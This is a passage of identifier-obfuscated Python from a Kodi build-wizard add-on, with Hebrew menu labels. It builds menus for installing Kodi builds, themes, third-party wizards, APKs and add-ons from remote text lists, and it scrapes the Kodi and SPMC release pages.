	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOO00OOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2196
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOOO00OOOO0000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2197
	setView ('files','viewType')#line:2198
def buildMenu ():#line:2200
	if USERNAME =='':#line:2201
		ADDON .openSettings ()#line:2202
		sys .exit ()#line:2203
	if PASSWORD =='':#line:2204
		ADDON .openSettings ()#line:2205
	O0O0000OO0OOOO0O0 =(SPEEDFILE )#line:2206
	(O0O0000OO0OOOO0O0 )#line:2207
	O0O00O0O000OO000O =(wiz .workingURL (O0O0000OO0OOOO0O0 ))#line:2208
	(O0O00O0O000OO000O )#line:2209
	O0O00O0O000OO000O =wiz .workingURL (SPEEDFILE )#line:2210
	if not O0O00O0O000OO000O ==True :#line:2211
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2212
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2213
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2214
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2215
		addFile ('%s'%O0O00O0O000OO000O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2216
	else :#line:2217
		O00O0OO0OOO0000O0 ,OO00O0OOO0OO000OO ,O000000OOO0O0OO0O ,OO000O0O00O0000O0 ,O00OOO00O0000OOOO ,OOOO000OOOO0O0000 ,O0OOO000O000000O0 =wiz .buildCount ()#line:2218
		O0O000O0O0OO00OO0 =False ;OO0OOO0O00O0O0OOO =[]#line:2219
		if THIRDPARTY =='true':#line:2220
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O000O0O0OO00OO0 =True ;OO0OOO0O00O0O0OOO .append ('1')#line:2221
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O000O0O0OO00OO0 =True ;OO0OOO0O00O0O0OOO .append ('2')#line:2222
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O000O0O0OO00OO0 =True ;OO0OOO0O00O0O0OOO .append ('3')#line:2223
		OO000OO0O0OOOO0O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2224
		OOOO0OOO000O0000O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO000OO0O0OOOO0O0 )#line:2225
		if O00O0OO0OOO0000O0 ==1 and O0O000O0O0OO00OO0 ==False :#line:2226
			for OO00O0OOO00O00O00 ,OO0O0OO0O00OO0000 ,O0000O0000000000O ,O0000OOOOOOOO000O ,OOO00O0OOO00O00OO ,O00OOO000O0O0O00O ,OOO00O0O0O0OOOO00 ,O0O000OOOO0OOO000 ,OOO000O00OOO000O0 ,OO0O00OOO0OO000OO in OOOO0OOO000O0000O :#line:2227
				if not SHOWADULT =='true'and OOO000O00OOO000O0 .lower ()=='yes':continue #line:2228
				if not DEVELOPER =='true'and wiz .strTest (OO00O0OOO00O00O00 ):continue #line:2229
				viewBuild (OOOO0OOO000O0000O [0 ][0 ])#line:2230
				return #line:2231
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2234
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2235
		if O0O000O0O0OO00OO0 ==True :#line:2236
			for OO00OOO00O0O00O00 in OO0OOO0O00O0O0OOO :#line:2237
				OO00O0OOO00O00O00 =eval ('THIRD%sNAME'%OO00OOO00O0O00O00 )#line:2238
		if len (OOOO0OOO000O0000O )>=1 :#line:2240
			if SEPERATE =='true':#line:2241
				for OO00O0OOO00O00O00 ,OO0O0OO0O00OO0000 ,O0000O0000000000O ,O0000OOOOOOOO000O ,OOO00O0OOO00O00OO ,O00OOO000O0O0O00O ,OOO00O0O0O0OOOO00 ,O0O000OOOO0OOO000 ,OOO000O00OOO000O0 ,OO0O00OOO0OO000OO in OOOO0OOO000O0000O :#line:2242
					if not SHOWADULT =='true'and OOO000O00OOO000O0 .lower ()=='yes':continue #line:2243
					if not DEVELOPER =='true'and wiz .strTest (OO00O0OOO00O00O00 ):continue #line:2244
					OOOOO000O00O00000 =createMenu ('install','',OO00O0OOO00O00O00 )#line:2245
					addDir ('[%s] %s (v%s)'%(float (OOO00O0OOO00O00OO ),OO00O0OOO00O00O00 ,OO0O0OO0O00OO0000 ),'viewbuild',OO00O0OOO00O00O00 ,description =OO0O00OOO0OO000OO ,fanart =O0O000OOOO0OOO000 ,icon =OOO00O0O0O0OOOO00 ,menu =OOOOO000O00O00000 ,themeit =THEME2 )#line:2246
			else :#line:2247
				if OO000O0O00O0000O0 >0 :#line:2248
					OO000OOO0OO00O000 ='+'if SHOW17 =='false'else '-'#line:2249
					if SHOW17 =='true':#line:2251
						for OO00O0OOO00O00O00 ,OO0O0OO0O00OO0000 ,O0000O0000000000O ,O0000OOOOOOOO000O ,OOO00O0OOO00O00OO ,O00OOO000O0O0O00O ,OOO00O0O0O0OOOO00 ,O0O000OOOO0OOO000 ,OOO000O00OOO000O0 ,OO0O00OOO0OO000OO in OOOO0OOO000O0000O :#line:2253
							if not SHOWADULT =='true'and OOO000O00OOO000O0 .lower ()=='yes':continue #line:2254
							if not DEVELOPER =='true'and wiz .strTest (OO00O0OOO00O00O00 ):continue #line:2255
							O0OO00O0OOO00000O =int (float (OOO00O0OOO00O00OO ))#line:2256
							if O0OO00O0OOO00000O ==17 :#line:2257
								OOOOO000O00O00000 =createMenu ('install','',OO00O0OOO00O00O00 )#line:2258
								addDir ('[%s] %s (v%s)'%(float (OOO00O0OOO00O00OO ),OO00O0OOO00O00O00 ,OO0O0OO0O00OO0000 ),'viewbuild',OO00O0OOO00O00O00 ,description =OO0O00OOO0OO000OO ,fanart =O0O000OOOO0OOO000 ,icon =OOO00O0O0O0OOOO00 ,menu =OOOOO000O00O00000 ,themeit =THEME2 )#line:2259
				if O00OOO00O0000OOOO >0 :#line:2260
					OO000OOO0OO00O000 ='+'if SHOW18 =='false'else '-'#line:2261
					if SHOW18 =='true':#line:2263
						for OO00O0OOO00O00O00 ,OO0O0OO0O00OO0000 ,O0000O0000000000O ,O0000OOOOOOOO000O ,OOO00O0OOO00O00OO ,O00OOO000O0O0O00O ,OOO00O0O0O0OOOO00 ,O0O000OOOO0OOO000 ,OOO000O00OOO000O0 ,OO0O00OOO0OO000OO in OOOO0OOO000O0000O :#line:2265
							if not SHOWADULT =='true'and OOO000O00OOO000O0 .lower ()=='yes':continue #line:2266
							if not DEVELOPER =='true'and wiz .strTest (OO00O0OOO00O00O00 ):continue #line:2267
							O0OO00O0OOO00000O =int (float (OOO00O0OOO00O00OO ))#line:2268
							if O0OO00O0OOO00000O ==18 :#line:2269
								OOOOO000O00O00000 =createMenu ('install','',OO00O0OOO00O00O00 )#line:2270
								addDir ('[%s] %s (v%s)'%(float (OOO00O0OOO00O00OO ),OO00O0OOO00O00O00 ,OO0O0OO0O00OO0000 ),'viewbuild',OO00O0OOO00O00O00 ,description =OO0O00OOO0OO000OO ,fanart =O0O000OOOO0OOO000 ,icon =OOO00O0O0O0OOOO00 ,menu =OOOOO000O00O00000 ,themeit =THEME2 )#line:2271
				if O000000OOO0O0OO0O >0 :#line:2272
					OO000OOO0OO00O000 ='+'if SHOW16 =='false'else '-'#line:2273
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OO000OOO0OO00O000 ,O000000OOO0O0OO0O ),'togglesetting','show16',themeit =THEME3 )#line:2274
					if SHOW16 =='true':#line:2275
						for OO00O0OOO00O00O00 ,OO0O0OO0O00OO0000 ,O0000O0000000000O ,O0000OOOOOOOO000O ,OOO00O0OOO00O00OO ,O00OOO000O0O0O00O ,OOO00O0O0O0OOOO00 ,O0O000OOOO0OOO000 ,OOO000O00OOO000O0 ,OO0O00OOO0OO000OO in OOOO0OOO000O0000O :#line:2276
							if not SHOWADULT =='true'and OOO000O00OOO000O0 .lower ()=='yes':continue #line:2277
							if not DEVELOPER =='true'and wiz .strTest (OO00O0OOO00O00O00 ):continue #line:2278
							O0OO00O0OOO00000O =int (float (OOO00O0OOO00O00OO ))#line:2279
							if O0OO00O0OOO00000O ==16 :#line:2280
								OOOOO000O00O00000 =createMenu ('install','',OO00O0OOO00O00O00 )#line:2281
								addDir ('[%s] %s (v%s)'%(float (OOO00O0OOO00O00OO ),OO00O0OOO00O00O00 ,OO0O0OO0O00OO0000 ),'viewbuild',OO00O0OOO00O00O00 ,description =OO0O00OOO0OO000OO ,fanart =O0O000OOOO0OOO000 ,icon =OOO00O0O0O0OOOO00 ,menu =OOOOO000O00O00000 ,themeit =THEME2 )#line:2282
				if OO00O0OOO0OO000OO >0 :#line:2283
					OO000OOO0OO00O000 ='+'if SHOW15 =='false'else '-'#line:2284
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OO000OOO0OO00O000 ,OO00O0OOO0OO000OO ),'togglesetting','show15',themeit =THEME3 )#line:2285
					if SHOW15 =='true':#line:2286
						for OO00O0OOO00O00O00 ,OO0O0OO0O00OO0000 ,O0000O0000000000O ,O0000OOOOOOOO000O ,OOO00O0OOO00O00OO ,O00OOO000O0O0O00O ,OOO00O0O0O0OOOO00 ,O0O000OOOO0OOO000 ,OOO000O00OOO000O0 ,OO0O00OOO0OO000OO in OOOO0OOO000O0000O :#line:2287
							if not SHOWADULT =='true'and OOO000O00OOO000O0 .lower ()=='yes':continue #line:2288
							if not DEVELOPER =='true'and wiz .strTest (OO00O0OOO00O00O00 ):continue #line:2289
							O0OO00O0OOO00000O =int (float (OOO00O0OOO00O00OO ))#line:2290
							if O0OO00O0OOO00000O <=15 :#line:2291
								OOOOO000O00O00000 =createMenu ('install','',OO00O0OOO00O00O00 )#line:2292
								addDir ('[%s] %s (v%s)'%(float (OOO00O0OOO00O00OO ),OO00O0OOO00O00O00 ,OO0O0OO0O00OO0000 ),'viewbuild',OO00O0OOO00O00O00 ,description =OO0O00OOO0OO000OO ,fanart =O0O000OOOO0OOO000 ,icon =OOO00O0O0O0OOOO00 ,menu =OOOOO000O00O00000 ,themeit =THEME2 )#line:2293
		elif O0OOO000O000000O0 >0 :#line:2294
			if OOOO000OOOO0O0000 >0 :#line:2295
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2296
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2297
			else :#line:2298
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2299
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2300
	setView ('files','viewType')#line:2301
def viewBuild (OO000OO00OO00OO0O ):#line:2303
	OO0O0OOO00O0000OO =wiz .workingURL (SPEEDFILE )#line:2304
	if not OO0O0OOO00O0000OO ==True :#line:2305
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2306
		addFile ('%s'%OO0O0OOO00O0000OO ,'',themeit =THEME3 )#line:2307
		return #line:2308
	if wiz .checkBuild (OO000OO00OO00OO0O ,'version')==False :#line:2309
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2310
		addFile ('%s was not found in the builds list.'%OO000OO00OO00OO0O ,'',themeit =THEME3 )#line:2311
		return #line:2312
	OO00O00O00O0O0O00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2313
	O0O0OOO0OO0OOOOO0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO000OO00OO00OO0O ).findall (OO00O00O00O0O0O00 )#line:2314
	for O000000O0OOO0O0OO ,OOO00000OO000OO00 ,O0O0OO0OO00O000OO ,OOOO0O0OO00OOO000 ,O0OO00OO000O00000 ,OOO0O00OOOOOO0000 ,O0000OOOOOO000OOO ,OO0O0OOOO0O00O00O ,O0OO0OO0OO00000O0 ,O000OO000O0000O0O in O0O0OOO0OO0OOOOO0 :#line:2315
		OOO0O00OOOOOO0000 =OOO0O00OOOOOO0000 if wiz .workingURL (OOO0O00OOOOOO0000 )else ICON #line:2316
		O0000OOOOOO000OOO =O0000OOOOOO000OOO if wiz .workingURL (O0000OOOOOO000OOO )else FANART #line:2317
		OOO000OO0O0O0OOOO ='%s (v%s)'%(OO000OO00OO00OO0O ,O000000O0OOO0O0OO )#line:2318
		if BUILDNAME ==OO000OO00OO00OO0O and O000000O0OOO0O0OO >BUILDVERSION :#line:2319
			OOO000OO0O0O0OOOO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOO000OO0O0O0OOOO ,BUILDVERSION )#line:2320
		O0O0O0OOO00000OOO =int (float (KODIV ));OO0OOOOOOO0O0000O =int (float (OOOO0O0OO00OOO000 ))#line:2329
		if not O0O0O0OOO00000OOO ==OO0OOOOOOO0O0000O :#line:2330
			if O0O0O0OOO00000OOO ==16 and OO0OOOOOOO0O0000O <=15 :OOOOOOOO0OO0O00O0 =False #line:2331
			else :OOOOOOOO0OO0O00O0 =True #line:2332
		else :OOOOOOOO0OO0O00O0 =False #line:2333
		addFile ('התקנה','install',OO000OO00OO00OO0O ,'fresh',description =O000OO000O0000O0O ,fanart =O0000OOOOOO000OOO ,icon =OOO0O00OOOOOO0000 ,themeit =THEME1 )#line:2337
		if not O0OO00OO000O00000 =='http://':#line:2340
			if wiz .workingURL (O0OO00OO000O00000 )==True :#line:2341
				addFile (wiz .sep ('THEMES'),'',fanart =O0000OOOOOO000OOO ,icon =OOO0O00OOOOOO0000 ,themeit =THEME3 )#line:2342
				OO00O00O00O0O0O00 =wiz .openURL (O0OO00OO000O00000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2343
				O0O0OOO0OO0OOOOO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00O00O00O0O0O00 )#line:2344
				for O00OOOOO0OO00O000 ,O000O0O0OO0OO0OOO ,OO0000O0OOOO0O0O0 ,O00OOO0OOO00OO0O0 ,O0OO0O0000OOOO0OO ,O000OO000O0000O0O in O0O0OOO0OO0OOOOO0 :#line:2345
					if not SHOWADULT =='true'and O0OO0O0000OOOO0OO .lower ()=='yes':continue #line:2346
					OO0000O0OOOO0O0O0 =OO0000O0OOOO0O0O0 if OO0000O0OOOO0O0O0 =='http://'else OOO0O00OOOOOO0000 #line:2347
					O00OOO0OOO00OO0O0 =O00OOO0OOO00OO0O0 if O00OOO0OOO00OO0O0 =='http://'else O0000OOOOOO000OOO #line:2348
					addFile (O00OOOOO0OO00O000 if not O00OOOOO0OO00O000 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O00OOOOO0OO00O000 ,'theme',OO000OO00OO00OO0O ,O00OOOOO0OO00O000 ,description =O000OO000O0000O0O ,fanart =O00OOO0OOO00OO0O0 ,icon =OO0000O0OOOO0O0O0 ,themeit =THEME3 )#line:2349
	setView ('files','viewType')#line:2350
def viewThirdList (OO0OOO000OOOO0OOO ):#line:2352
	O0000O0O00O0O0000 =eval ('THIRD%sNAME'%OO0OOO000OOOO0OOO )#line:2353
	O00O000O0OO0O0O00 =eval ('THIRD%sURL'%OO0OOO000OOOO0OOO )#line:2354
	OO00O0O000OO0O0OO =wiz .workingURL (O00O000O0OO0O0O00 )#line:2355
	if not OO00O0O000OO0O0OO ==True :#line:2356
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2357
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2358
	else :#line:2359
		O00O0O00000O00O00 ,O0OOOOO00000O00OO =wiz .thirdParty (O00O000O0OO0O0O00 )#line:2360
		addFile ("[B]%s[/B]"%O0000O0O00O0O0000 ,'',themeit =THEME3 )#line:2361
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2362
		if O00O0O00000O00O00 :#line:2363
			for O0000O0O00O0O0000 ,O0O0O00OOO00OO0O0 ,O00O000O0OO0O0O00 ,OO00O00000OO0000O ,O0O0000O0O0O0O0OO ,O00O0O0OO0O0O0O00 ,O00000OOOOOO0OOO0 ,O00O0OOOOO00O000O in O0OOOOO00000O00OO :#line:2364
				if not SHOWADULT =='true'and O00000OOOOOO0OOO0 .lower ()=='yes':continue #line:2365
				addFile ("[%s] %s v%s"%(OO00O00000OO0000O ,O0000O0O00O0O0000 ,O0O0O00OOO00OO0O0 ),'installthird',O0000O0O00O0O0000 ,O00O000O0OO0O0O00 ,icon =O0O0000O0O0O0O0OO ,fanart =O00O0O0OO0O0O0O00 ,description =O00O0OOOOO00O000O ,themeit =THEME2 )#line:2366
		else :#line:2367
			for O0000O0O00O0O0000 ,O00O000O0OO0O0O00 ,O0O0000O0O0O0O0OO ,O00O0O0OO0O0O0O00 ,O00O0OOOOO00O000O in O0OOOOO00000O00OO :#line:2368
				addFile (O0000O0O00O0O0000 ,'installthird',O0000O0O00O0O0000 ,O00O000O0OO0O0O00 ,icon =O0O0000O0O0O0O0OO ,fanart =O00O0O0OO0O0O0O00 ,description =O00O0OOOOO00O000O ,themeit =THEME2 )#line:2369
def editThirdParty (OO0O000OOO0OO0O00 ):#line:2371
	OOO0O0O000OO0OOO0 =eval ('THIRD%sNAME'%OO0O000OOO0OO0O00 )#line:2372
	OOOOO0OOOO0OOO00O =eval ('THIRD%sURL'%OO0O000OOO0OO0O00 )#line:2373
	O00000O0O00OO0O00 =wiz .getKeyboard (OOO0O0O000OO0OOO0 ,'Enter the Name of the Wizard')#line:2374
	OOO0OO00O00OO0000 =wiz .getKeyboard (OOOOO0OOOO0OOO00O ,'Enter the URL of the Wizard Text')#line:2375
	wiz .setS ('wizard%sname'%OO0O000OOO0OO0O00 ,O00000O0O00OO0O00 )#line:2377
	wiz .setS ('wizard%surl'%OO0O000OOO0OO0O00 ,OOO0OO00O00OO0000 )#line:2378
def apkScraper (name =""):#line:2380
	if name =='kodi':#line:2381
		O0OOOO00O00O00000 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2382
		O0000OO0000O0000O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2383
		OO000O0OO0OO00OO0 =wiz .openURL (O0OOOO00O00O00000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2384
		OO00OO00O00O0O00O =wiz .openURL (O0000OO0000O0000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2385
		OO0OOOOO0000OO000 =0 #line:2386
		OOO0OO0O0O00OOOO0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO000O0OO0OO00OO0 )#line:2387
		OO00OOO0000O0O000 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO00OO00O00O0O00O )#line:2388
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2390
		OO0O000OOO0OOO0O0 =False #line:2391
		for O00OO0O0OO000OO0O ,name ,O0O0OO00O0O0O000O ,O0O0OOOO00O00O0OO in OOO0OO0O0O00OOOO0 :#line:2392
			if O00OO0O0OO000OO0O in ['../','old/']:continue #line:2393
			if not O00OO0O0OO000OO0O .endswith ('.apk'):continue #line:2394
			if not O00OO0O0OO000OO0O .find ('_')==-1 and OO0O000OOO0OOO0O0 ==True :continue #line:2395
			try :#line:2396
				O000O00O0O00OO00O =name .split ('-')#line:2397
				if not O00OO0O0OO000OO0O .find ('_')==-1 :#line:2398
					OO0O000OOO0OOO0O0 =True #line:2399
					O0OO0000O0O000O00 ,OOO00O00O000OOOO0 =O000O00O0O00OO00O [2 ].split ('_')#line:2400
				else :#line:2401
					O0OO0000O0O000O00 =O000O00O0O00OO00O [2 ]#line:2402
					OOO00O00O000OOOO0 =''#line:2403
				OOOO0OO0O00O0O0O0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O00O0O00OO00O [0 ].title (),O000O00O0O00OO00O [1 ],OOO00O00O000OOOO0 .upper (),O0OO0000O0O000O00 ,COLOR2 ,O0O0OO00O0O0O000O .replace (' ',''),COLOR1 ,O0O0OOOO00O00O0OO )#line:2404
				OO0O0OOOOO0O0OO0O =urljoin (O0OOOO00O00O00000 ,O00OO0O0OO000OO0O )#line:2405
				addFile (OOOO0OO0O00O0O0O0 ,'apkinstall',"%s v%s%s %s"%(O000O00O0O00OO00O [0 ].title (),O000O00O0O00OO00O [1 ],OOO00O00O000OOOO0 .upper (),O0OO0000O0O000O00 ),OO0O0OOOOO0O0OO0O )#line:2406
				OO0OOOOO0000OO000 +=1 #line:2407
			except :#line:2408
				wiz .log ("Error on: %s"%name )#line:2409
		for O00OO0O0OO000OO0O ,name ,O0O0OO00O0O0O000O ,O0O0OOOO00O00O0OO in OO00OOO0000O0O000 :#line:2411
			if O00OO0O0OO000OO0O in ['../','old/']:continue #line:2412
			if not O00OO0O0OO000OO0O .endswith ('.apk'):continue #line:2413
			if not O00OO0O0OO000OO0O .find ('_')==-1 :continue #line:2414
			try :#line:2415
				O000O00O0O00OO00O =name .split ('-')#line:2416
				OOOO0OO0O00O0O0O0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O00O0O00OO00O [0 ].title (),O000O00O0O00OO00O [1 ],O000O00O0O00OO00O [2 ],COLOR2 ,O0O0OO00O0O0O000O .replace (' ',''),COLOR1 ,O0O0OOOO00O00O0OO )#line:2417
				OO0O0OOOOO0O0OO0O =urljoin (O0000OO0000O0000O ,O00OO0O0OO000OO0O )#line:2418
				addFile (OOOO0OO0O00O0O0O0 ,'apkinstall',"%s v%s %s"%(O000O00O0O00OO00O [0 ].title (),O000O00O0O00OO00O [1 ],O000O00O0O00OO00O [2 ]),OO0O0OOOOO0O0OO0O )#line:2419
				OO0OOOOO0000OO000 +=1 #line:2420
			except :#line:2421
				wiz .log ("Error on: %s"%name )#line:2422
		if OO0OOOOO0000OO000 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2423
	elif name =='spmc':#line:2424
		O00O00OO0OO0O0OOO ='https://github.com/koying/SPMC/releases'#line:2425
		OO000O0OO0OO00OO0 =wiz .openURL (O00O00OO0OO0O0OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2426
		OO0OOOOO0000OO000 =0 #line:2427
		OOO0OO0O0O00OOOO0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO000O0OO0OO00OO0 )#line:2428
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2430
		for name ,OO0000O0OO0000O0O in OOO0OO0O0O00OOOO0 :#line:2432
			O0OO0OO00O0O000OO =''#line:2433
			OO00OOO0000O0O000 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OO0000O0OO0000O0O )#line:2434
			for O00O000O0O0OOOOOO ,OO00OO00000OO0OO0 ,OOOOO0OOO0OOO0OOO in OO00OOO0000O0O000 :#line:2435
				if OOOOO0OOO0OOO0OOO .find ('armeabi')==-1 :continue #line:2436
				if OOOOO0OOO0OOO0OOO .find ('launcher')>-1 :continue #line:2437
				O0OO0OO00O0O000OO =urljoin ('https://github.com',O00O000O0O0OOOOOO )#line:2438
				break #line:2439
		if OO0OOOOO0000OO000 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2441
def apkMenu (url =None ):#line:2443
	if url ==None :#line:2444
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2447
	if not APKFILE =='http://':#line:2448
		if url ==None :#line:2449
			OO0O000O0000OO000 =wiz .workingURL (APKFILE )#line:2450
			O0O00000O0OOOO000 =uservar .APKFILE #line:2451
		else :#line:2452
			OO0O000O0000OO000 =wiz .workingURL (url )#line:2453
			O0O00000O0OOOO000 =url #line:2454
		if OO0O000O0000OO000 ==True :#line:2455
			O00OO000OOO00O00O =wiz .openURL (O0O00000O0OOOO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2456
			O0O00OOOOOO00O0O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OO000OOO00O00O )#line:2457
			if len (O0O00OOOOOO00O0O0 )>0 :#line:2458
				O0O0OOOOO00OO0OOO =0 #line:2459
				for O00O00O00OOO000O0 ,O00OO0O0OOOO000OO ,url ,OOO0OO0O0O000O0O0 ,OO0O0O00O0O000O00 ,O0OO0O0O0000OO0O0 ,OO000000O00000000 in O0O00OOOOOO00O0O0 :#line:2460
					if not SHOWADULT =='true'and O0OO0O0O0000OO0O0 .lower ()=='yes':continue #line:2461
					if O00OO0O0OOOO000OO .lower ()=='yes':#line:2462
						O0O0OOOOO00OO0OOO +=1 #line:2463
						addDir ("[B]%s[/B]"%O00O00O00OOO000O0 ,'apk',url ,description =OO000000O00000000 ,icon =OOO0OO0O0O000O0O0 ,fanart =OO0O0O00O0O000O00 ,themeit =THEME3 )#line:2464
					else :#line:2465
						O0O0OOOOO00OO0OOO +=1 #line:2466
						addFile (O00O00O00OOO000O0 ,'apkinstall',O00O00O00OOO000O0 ,url ,description =OO000000O00000000 ,icon =OOO0OO0O0O000O0O0 ,fanart =OO0O0O00O0O000O00 ,themeit =THEME2 )#line:2467
					if O0O0OOOOO00OO0OOO <1 :#line:2468
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2469
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2470
		else :#line:2471
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2472
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2473
			addFile ('%s'%OO0O000O0000OO000 ,'',themeit =THEME3 )#line:2474
		return #line:2475
	else :wiz .log ("[APK Menu] No APK list added.")#line:2476
	setView ('files','viewType')#line:2477
def addonMenu (url =None ):#line:2479
	if not ADDONFILE =='http://':#line:2480
		if url ==None :#line:2481
			OO00000O0O0O00OOO =wiz .workingURL (ADDONFILE )#line:2482
			OO0O000O0OO0O00O0 =uservar .ADDONFILE #line:2483
		else :#line:2484
			OO00000O0O0O00OOO =wiz .workingURL (url )#line:2485
			OO0O000O0OO0O00O0 =url #line:2486
		if OO00000O0O0O00OOO ==True :#line:2487
			O0000OOO0000O0O0O =wiz .openURL (OO0O000O0OO0O00O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2488
			O00O000OO0000OOO0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0000OOO0000O0O0O )#line:2489
			if len (O00O000OO0000OOO0 )>0 :#line:2490
				O00O00000OO0000O0 =0 #line:2491
				for O0OOOO0OO00000O00 ,O00OO0O00O000OOO0 ,url ,O0OO00000OO0OOOO0 ,OOOO00O0OOOO0O0O0 ,O0O00O0OOOO0O0OOO ,OOOOOOO0O0000OO0O ,O0OO000OO0O0O0000 ,OOO0O00O00OO0O00O ,O0OO000O0000000OO in O00O000OO0000OOO0 :#line:2492
					if O00OO0O00O000OOO0 .lower ()=='section':#line:2493
						O00O00000OO0000O0 +=1 #line:2494
						addDir ("[B]%s[/B]"%O0OOOO0OO00000O00 ,'addons',url ,description =O0OO000O0000000OO ,icon =OOOOOOO0O0000OO0O ,fanart =O0OO000OO0O0O0000 ,themeit =THEME3 )#line:2495
					else :#line:2496
						if not SHOWADULT =='true'and OOO0O00O00OO0O00O .lower ()=='yes':continue #line:2497
						try :#line:2498
							O00O00O0O00O00O00 =xbmcaddon .Addon (id =O00OO0O00O000OOO0 ).getAddonInfo ('path')#line:2499
							if os .path .exists (O00O00O0O00O00O00 ):#line:2500
								O0OOOO0OO00000O00 ="[COLOR green][Installed][/COLOR] %s"%O0OOOO0OO00000O00 #line:2501
						except :#line:2502
							pass #line:2503
						O00O00000OO0000O0 +=1 #line:2504
						addFile (O0OOOO0OO00000O00 ,'addoninstall',O00OO0O00O000OOO0 ,OO0O000O0OO0O00O0 ,description =O0OO000O0000000OO ,icon =OOOOOOO0O0000OO0O ,fanart =O0OO000OO0O0O0000 ,themeit =THEME2 )#line:2505
					if O00O00000OO0000O0 <1 :#line:2506
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2507
			else :#line:2508
